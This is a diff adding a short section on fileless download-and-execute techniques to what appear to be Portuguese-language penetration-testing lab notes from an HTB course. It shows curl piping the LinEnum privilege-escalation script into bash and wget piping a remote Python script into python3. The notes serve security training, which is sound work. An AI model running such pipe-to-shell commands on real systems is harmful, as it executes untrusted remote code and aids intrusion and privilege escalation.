@@ -229,3 +229,19 @@ Gust4vo@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/mas
 ```
 Gust4vo@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 ```
+
+### Ataques sem arquivo usando Linux
+
+- Download sem arquivo com cURL
+
+```
+Gust4vo@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+```
+- Download sem arquivo com wget
+
+```
+Gust4vo@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
+Hello World!
+```
+
+
